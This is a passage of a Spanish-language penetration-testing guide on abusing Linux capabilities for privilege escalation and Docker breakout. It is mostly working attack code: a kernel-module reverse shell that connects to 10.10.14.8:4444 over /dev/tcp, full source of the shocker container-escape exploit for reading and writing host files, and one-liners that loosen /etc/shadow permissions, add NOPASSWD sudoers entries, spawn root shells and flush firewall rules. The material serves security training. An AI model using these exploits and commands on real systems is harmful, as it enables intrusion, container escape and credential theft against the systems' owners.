Dentro de la salida anterior puedes ver que la capability **SYS_MODULE** está habilitada.<sup>[[14]](#references)</sup>

**Crea** el **kernel module** que va a ejecutar un **reverse shell** y el **Makefile** para **compilarlo**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> El carácter en blanco antes de cada palabra make en el Makefile **debe ser un tabulador, no espacios**.

Ejecuta `make` para compilarlo.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Finalmente, inicia `nc` dentro de una shell y **carga el módulo** desde otra; capturarás la shell en el proceso `nc`:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**El código de esta técnica fue copiado del laboratorio "Abusing SYS_MODULE Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Otro ejemplo de esta técnica se puede encontrar en [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite a un proceso **omitir los permisos para leer archivos y para leer y ejecutar directorios**. Su uso principal es buscar o leer archivos. Sin embargo, también permite a un proceso utilizar la función `open_by_handle_at(2)`, que puede acceder a cualquier archivo, incluidos aquellos que están fuera del mount namespace del proceso. El handle utilizado en `open_by_handle_at(2)` debería ser un identificador no transparente obtenido mediante `name_to_handle_at(2)`, pero puede incluir información sensible, como números de inode, que son vulnerables a manipulación. Sebastian Krahmer demostró el potencial de explotación de esta capability, particularmente en el contexto de Docker containers, mediante el exploit shocker, tal como se analiza [aquí](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)</sup>
**Esto significa que puedes omitir las comprobaciones de permisos de lectura de archivos y las comprobaciones de permisos de lectura/ejecución de directorios**.<sup>[[14]](#references)</sup>

**Ejemplo con un binario**

El binario puede leer archivos accesibles en sus namespaces. Por lo tanto, si un archivo como `tar` tiene esta capability, puede leer el archivo shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Ejemplo con binary2**

En este caso, supongamos que el binario **`python`** tiene esta capability. Para listar archivos de root, podrías ejecutar:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Y para leer un archivo podrías hacer lo siguiente:
```python
print(open("/etc/shadow", "r").read())
```
**Ejemplo en Environment (Docker breakout)**

Puedes comprobar las capabilities habilitadas dentro del contenedor Docker usando `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
En el resultado anterior puedes ver que la capability **DAC_READ_SEARCH** está habilitada. Esto omite las comprobaciones de lectura/búsqueda de DAC y permite `open_by_handle_at(2)`; por sí misma, no es una capability de depuración de procesos.<sup>[[14]](#references)</sup>

Puedes aprender cómo funciona el siguiente exploit en [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), pero, en resumen, **CAP_DAC_READ_SEARCH** permite recorrer el sistema de archivos sin comprobaciones de permisos y permite `open_by_handle_at(2)`; esto puede exponer archivos abiertos por otros procesos cuando los namespaces y mounts relevantes son accesibles.<sup>[[13]](#references)[[14]](#references)</sup>

El exploit original que abusa de estos permisos para leer archivos del host se puede encontrar aquí: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); lo siguiente es una **versión modificada que permite pasar el archivo que se quiere leer como primer argumento y volcar el resultado en un archivo**.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> El exploit necesita encontrar un puntero a algo montado en el host. El exploit original utilizaba el archivo /.dockerinit y esta versión modificada utiliza /etc/hostname. Si el exploit no funciona, quizá tengas que establecer un archivo diferente. Para encontrar un archivo que esté montado en el host, simplemente ejecuta el comando mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: El exploit necesita encontrar un puntero a algo montado en el host. El exploit original utilizaba el archivo /.dockerinit y esta versión modificada utiliza...](<../../images/image (407) (1).png>)

**El código de esta técnica se copió del laboratorio "Abusing DAC_READ_SEARCH Capability" de** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Esta capability omite las comprobaciones de permisos de lectura, escritura y ejecución de archivos**.<sup>[[14]](#references)</sup>

Busca archivos que se vuelvan legibles o modificables mediante la pertenencia a un grupo privilegiado; los objetivos útiles dependen de la propiedad y los bits de modo del objetivo.<sup>[[14]](#references)</sup>

**Ejemplo con un binario**

En este ejemplo, vim tiene esta capability, por lo que puedes modificar cualquier archivo como _passwd_, _sudoers_ o _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Ejemplo con el binario 2**

En este ejemplo, el binario **`python`** tendrá esta capability. Podrías usar python para sobrescribir cualquier archivo:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Ejemplo con environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Confirma `CAP_DAC_OVERRIDE` con `capsh --print` como se muestra en el ejemplo anterior de environment de `CAP_DAC_READ_SEARCH`.<sup>[[14]](#references)[[26]](#references)</sup>

En primer lugar, lee la sección anterior que [**abusa de la capability DAC_READ_SEARCH para leer archivos arbitrarios**](linux-capabilities.md#cap_dac_read_search) del host y **compila** el exploit.\
Después, **compila la siguiente versión del exploit shocker**, que te permitirá **escribir archivos arbitrarios** dentro del sistema de archivos del host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Para escapar del contenedor de Docker, podrías **descargar** los archivos `/etc/shadow` y `/etc/passwd` del host, **añadirles** un **nuevo usuario** y usar **`shocker_write`** para sobrescribirlos. Después, **acceder** mediante **ssh**.

**El código de esta técnica se copió del laboratorio "Abusing DAC_OVERRIDE Capability" de** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Esta capability permite a un proceso cambiar la propiedad de los archivos**.<sup>[[14]](#references)</sup>

**Ejemplo con un binario**

Supongamos que el binario **`python`** tiene esta capability; puedes cambiar el propietario de un archivo como **`shadow`** y, después, usar el acceso resultante para modificarlo si los demás permisos lo permiten:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
O con el binario **`ruby`** teniendo esta capability:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Esta capability omite las comprobaciones de propiedad para muchas operaciones de archivos, incluido el cambio de permisos**.<sup>[[14]](#references)</sup>

**Ejemplo con un binario**

Si Python tiene esta capability, puedes modificar los permisos del archivo shadow, **cambiar la contraseña de root** y escalar privilegios:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**Esta capability permite a un proceso cambiar su ID de usuario efectivo, sujeto a las reglas de credenciales y capabilities aplicadas por el kernel**.<sup>[[14]](#references)</sup>

**Ejemplo con un binario**

Si python tiene esta **capability**, puedes abusar de ella muy fácilmente para escalar privilegios a root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Otra forma:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Esta capability permite que un proceso cambie su ID de grupo efectivo, sujeto a las reglas de credenciales y capabilities aplicadas por el kernel**.<sup>[[14]](#references)</sup>

Hay muchos archivos que puedes **sobrescribir para escalar privilegios,** [**puedes obtener ideas aquí**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Ejemplo con un binario**

En este caso, debes buscar archivos interesantes que un grupo pueda leer porque puedes suplantar a cualquier grupo:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Una vez que hayas encontrado un archivo que puedas aprovechar (mediante lectura o escritura) para escalar privilegios, puedes **obtener una shell suplantando al grupo interesante** con:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
En este caso, se suplantó al grupo shadow, por lo que puedes leer el archivo `/etc/shadow`:
```bash
cat /etc/shadow
```
### Cadena combinada: CAP_SETGID + CAP_CHOWN

Cuando ambas capabilities están disponibles en el mismo helper, una cadena práctica es:

1. Cambiar el EGID a `shadow` (u otro grupo privilegiado).
2. Usar `chown` en `/etc/shadow` para establecer tu UID manteniendo el grupo `shadow`.
3. Leer un hash objetivo y crackearlo o pivotar.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Esto evita necesitar acceso root completo directamente y suele ser suficiente para pivotar mediante la reutilización de credenciales.

Si **docker** está instalado, podrías **suplantar** el **grupo docker** y abusar de él para comunicarte con el [**docker socket y escalar privilegios**](#writable-docker-socket).

## CAP_SETFCAP

**Esta capability permite a un proceso establecer capabilities de archivo**.<sup>[[14]](#references)</sup>

**Ejemplo con un binario**

Si Python tiene esta **capability**, puedes abusar de ella muy fácilmente para escalar privilegios a root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Un conjunto de capabilities escrito recientemente reemplaza el conjunto anterior; si el helper se ejecuta después únicamente con las nuevas capabilities, puede dejar de conservar `CAP_SETFCAP` para actualizar otro archivo.<sup>[[14]](#references)[[25]](#references)</sup>

Una vez que tengas la [capacidad SETUID](linux-capabilities.md#cap_setuid), puedes ir a su sección para ver cómo escalar privilegios.

**Ejemplo con el entorno (Docker breakout)**

El conjunto de capabilities predeterminado documentado de Docker incluye **CAP_SETFCAP**, pero el conjunto real depende de la configuración del runtime.<sup>[[19]](#references)</sup>
Puedes inspeccionar las capabilities del proceso con:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Esta capability permite escribir capacidades de archivo, pero por sí sola no concede esas capacidades al proceso actual ni evita las reglas de archivo, bounding-set y namespace aplicadas cuando se ejecuta el archivo.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
Las capabilities permitidas del archivo están limitadas por el capability bounding set del proceso, y el bit effective del archivo controla si el permitted set del archivo se incorpora al effective set del proceso. Por eso, añadir capabilities a un archivo no hace automáticamente que todas las capabilities solicitadas se puedan usar durante la ejecución.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) proporciona varias operaciones sensibles, incluido el acceso a `/dev/mem`, `/dev/kmem` o `/proc/kcore`, la modificación de `mmap_min_addr`, el acceso a las system calls `ioperm(2)` e `iopl(2)` y varios comandos de disco. El `FIBMAP ioctl(2)` también se habilita mediante esta capability, lo que ha causado problemas en el [pasado](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Según la página del manual, esto también permite al titular realizar diversas operaciones específicas del dispositivo en otros dispositivos.<sup>[[14]](#references)</sup>

Esto puede ser útil para **privilege escalation** y **Docker breakout**.<sup>[[14]](#references)</sup>

## CAP_KILL

**Esta capability omite las comprobaciones de permisos para enviar señales a procesos en los casos definidos por el kernel**.<sup>[[14]](#references)</sup>

**Ejemplo con un binario**

Supongamos que el binario **`python`** tiene esta capability. Si también pudieras **modificar algún archivo de configuración de un servicio o socket** (o cualquier archivo de configuración relacionado con un servicio), podrías introducirle un backdoor y después terminar el proceso relacionado con ese servicio y esperar a que el nuevo archivo de configuración se ejecute con tu backdoor.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Si tienes capacidades de kill y hay un **programa de Node ejecutándose como root** (o como un usuario diferente), probablemente podrías **enviarle** la **señal SIGUSR1** y hacer que **abra el debugger de Node**, al que podrás conectarte.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Esta capability permite vincularse a puertos de Internet inferiores a 1024.** No concede directamente una escalada de privilegios más amplia.<sup>[[14]](#references)</sup>

**Ejemplo con un binario**

Si **`python`** tiene esta capability, podrá escuchar en cualquier puerto e incluso conectarse desde él a cualquier otro puerto (algunos servicios requieren conexiones desde puertos con privilegios específicos).

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite a los procesos **crear sockets RAW y PACKET**, lo que les permite generar y enviar paquetes de red arbitrarios. Esto puede provocar riesgos de seguridad en entornos containerizados, como la suplantación de paquetes, la inyección de tráfico y la evasión de controles de acceso a la red. Los actores maliciosos podrían aprovechar esto para interferir con el enrutamiento del contenedor o comprometer la seguridad de la red del host, especialmente sin protecciones de firewall adecuadas. Además, **CAP_NET_RAW** permite operaciones como hacer ping mediante solicitudes ICMP RAW.<sup>[[14]](#references)</sup>

**Esto puede permitir la captura de paquetes con una interfaz de socket adecuada.** No concede directamente una escalada de privilegios más amplia.<sup>[[14]](#references)</sup>

**Ejemplo con un binario**

Si el binario **`tcpdump`** tiene esta capability, podrás utilizarlo para capturar información de red.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Si el **entorno** otorga esta capacidad, **`tcpdump`** también puede usarla para capturar tráfico.<sup>[[14]](#references)</sup>

**Ejemplo con binario 2**

El siguiente ejemplo es código de **`python2`** que puede ser útil para interceptar el tráfico de la interfaz "**lo**" (**localhost**). El código procede del laboratorio "_Conceptos básicos: CAP-NET_BIND + NET_RAW_" de [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) otorga al titular la capacidad de **alterar las configuraciones de red**, incluidos los ajustes del firewall, las tablas de enrutamiento, los permisos de los sockets y la configuración de las interfaces de red dentro de los network namespaces expuestos. También permite activar el **promiscuous mode** en las interfaces de red, lo que permite realizar packet sniffing entre namespaces.<sup>[[14]](#references)</sup>

**Ejemplo con un binario**

Supongamos que el **binario de python** tiene estas capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Esta capability permite modificar flags de inode, como immutable y append-only.** No otorga directamente una escalada de privilegios más amplia.<sup>[[14]](#references)</sup>

**Ejemplo con un binario**

Si encuentras que un archivo es immutable y python tiene esta capability, puedes **eliminar el atributo immutable y hacer que el archivo sea modificable:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
f.write('New content for the file\n')
```
Las operaciones `FS_IOC_GETFLAGS` y `FS_IOC_SETFLAGS` leen y actualizan los flags del inode; `FS_IMMUTABLE_FL` es el flag immutable que este ejemplo elimina.<sup>[[27]](#references)</sup>

> [!TIP]
> Ten en cuenta que normalmente este atributo immutable se establece y elimina usando:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite la ejecución de la llamada al sistema `chroot(2)`, lo que potencialmente puede permitir escapar de entornos `chroot(2)` mediante vulnerabilidades conocidas.<sup>[[11]](#references)[[14]](#references)</sup>

- [Cómo escapar de varias soluciones chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: herramienta para escapar de chroot](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite la ejecución de la llamada al sistema `reboot(2)` para reiniciar el sistema, incluidos comandos como `LINUX_REBOOT_CMD_RESTART2`; también habilita `kexec_load(2)` y, desde Linux 3.17 en adelante, `kexec_file_load(2)` para cargar kernels nuevos o firmados destinados respectivamente a gestionar fallos del sistema.<sup>[[14]](#references)</sup>

## CAP_SYSLOG

